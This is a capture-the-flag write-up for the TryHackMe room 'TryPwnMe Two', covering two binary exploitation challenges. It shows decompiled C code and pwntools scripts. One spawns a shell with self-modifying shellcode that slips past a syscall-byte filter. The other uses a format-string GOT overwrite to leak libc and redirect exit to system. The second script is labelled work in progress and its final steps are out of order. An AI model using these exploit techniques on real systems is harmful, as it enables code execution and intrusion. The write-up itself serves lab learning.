# TryPwnMe Two

<https://tryhackme.com/room/trypwnmetwo>

A sequel to [TryPwnMe One](https://tryhackme.com/room/trypwnmeone) ([my writeup](./trypwnmeone.md))

## TryExecMe2

This is a shell code executor: it reads 100 chars from the input, runs them through a function called 'forbidden' which looks for any use of `\x0f \x05` (syscall) or `\x0f \x32` (sysenter) or `\xcd \x80` (int 80, old fashioned syscall) and, if none of these are found, will then run the code as if it was a function.

```c
undefined8 main(void)
{
  char cVar1;
  code *__buf;
  
  setup();
  banner();
  __buf = (code *)mmap((void *)0xcafe0000,100,7,0x22,-1,0);
  puts("\nGive me your spell, and I will execute it: ");
  read(0,__buf,0x80);
  puts("\nExecuting Spell...\n");
  cVar1 = forbidden(__buf);
  if (cVar1 != '\0') {
    exit(1);
  }
  (*__buf)();
  return 0;
}

undefined8 forbidden(long param_1)
{
  ulong local_18;
  
  local_18 = 0;
  while( true ) {
    if (0x7e < local_18) {
      return 0;
    }
    if ((*(char *)(local_18 + param_1) == '\x0f') && (*(char *)(param_1 + local_18 + 1) == '\x05'))
    {
      puts("Forbidden spell detected!");
      return 1;
    }
    if ((*(char *)(local_18 + param_1) == '\x0f') && (*(char *)(param_1 + local_18 + 1) == '4')) {
      puts("Forbidden spell detected!");
      return 1;
    }
    if ((*(char *)(local_18 + param_1) == -0x33) && (*(char *)(param_1 + local_18 + 1) == -0x80))
    break;
    local_18 = local_18 + 1;
  }
  puts("Forbidden spell detected!");
  return 1;
}
```

So what can you do with a < 100 byte shellcode, where you can't use any syscalls (at least directly)?

The solution is to use some self-modifying shellcode:

1. we execute /bin/sh via execve as normal. This is setting up some stack variables and then invoking syscall (`\x05\x0f`)
2. instead of the syscall opcodes though, we put two nops `\x90\x90`
3. and at the beginning, before we set up args, we find the syscall address and replace it with the right codes
4. the right codes are stored xor'ed, and are un-xor'd before writing

the below pwntools code does all of this and spawns a shell:

```python
from pwn import *

context.arch = 'amd64'
shellcode = asm('''
    lea rsi, [rip + syscall_location]
    mov ax, 0x7316
    xor ax, 0x7619 /* 0x7316 ^ 0x7619 = 0x050f */
    mov [rsi], ax
    
    /* execve setup */
    xor rdx, rdx
    push rdx
    mov rax, 0x68732f2f6e69622f /* /bin/sh */
    push rax
    mov rdi, rsp
    push rdx
    push rdi
    mov rsi, rsp
    mov rax, 59
    
syscall_location:
    nop
    nop
''')

# p = process('./TryExecMe2/tryexecme2')
p = remote('10.10.49.142', 5002)

p.clean()
p.sendline(shellcode)
p.interactive()
```

## NotSpecified2

This is a format string vulnerability:

```c
void main(void)
{
  long in_FS_OFFSET;
  char local_218 [520];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts("Please provide your username:");
  read(0,local_218,0x200);
  printf("Thanks ");
  printf(local_218);
  exit(0x539);
  return;
}
```

Fairly standard. The binary has all protections but is not PIE, and the libc it uses is also provided. By testing with "AAAAAAAA %6$p" we find the offset to the buffer is 6. The goal will be to overwrite the got entry for exit with something, likely system. However, we need a libc leak (as libc itself is PIE) to find the address of system... as the program only reads and writes once, we will need to loop main.

The steps will be:

1. Use format string bug to overwrite exit to main's address, causing main to loop
2. On second loop, leak a libc address, so we can calculate where libc is (its PIE)
3. On the third loop, overwrite exit with system and win

the below code will do this (WIP):

```python
from pwn import *

elf = context.binary = ELF("./NotSpecified2/notspecified2")
libc = ELF("./NotSpecified2/libc.so.6")
ld = ELF("./NotSpecified2/ld-linux-x86-64.so.2")

exit_got = elf.got.exit
main_addr = elf.sym.main

p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
# p = remote('10.10.87.64', 5000)
p.clean()

# offset found with p.sendline(b'AAAAAAAA %6$p')
offset = 6

# make main loop by changing the final exit to the start of main
payload = fmtstr_payload(6, {exit_got : main_addr})
p.sendline(payload)

interim = p.clean()

# on second loop leak printf address to calculate libc base
payload = b"%7$s||||" + p64(elf.got.puts)
p.sendline(payload)

result = p.clean()
puts_address = u64(result[7:13].ljust(8, b'\x00'))
libc.address = puts_address - libc.sym.puts

interim = p.clean()

# set exit to system on third loop
payload = fmtstr_payload(6, {exit_got : libc.sym.system})

p.interactive()

p.sendline(payload)
p.interactive()
```
